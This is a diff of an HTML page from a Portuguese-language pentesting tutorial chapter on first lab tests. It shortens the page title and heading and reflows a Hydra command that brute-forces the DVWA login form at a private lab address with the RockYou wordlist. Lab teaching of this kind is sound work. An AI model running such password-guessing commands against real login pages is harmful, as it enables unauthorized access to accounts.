@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Capítulo 6 - Primeiros Testes no Lab Hacker</title>
+    <title>Capítulo 6 - Primeiros Testes </title>
     <link rel="stylesheet" href="style.css" />
     <link rel="icon" href="favicon.icon.jpg">
 
@@ -17,7 +17,7 @@
 
 <body>
     <header>
-        <h1>Capítulo 6: Primeiros Testes no Lab Hacker</h1>
+        <h1>Capítulo 6: Primeiros Testes</h1>
     </header>
 
     <main>
@@ -51,7 +51,8 @@
             <p>
                 Vamos tentar quebrar uma senha de login simples no DVWA:
             </p>
-            <pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed"</code></pre>
+            <pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 http-post-form
+                "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed"</code></pre>
             <p>
                 Isso tenta mil senhas usando o dicionário RockYou. Só usa isso em ambiente controlado!
             </p>
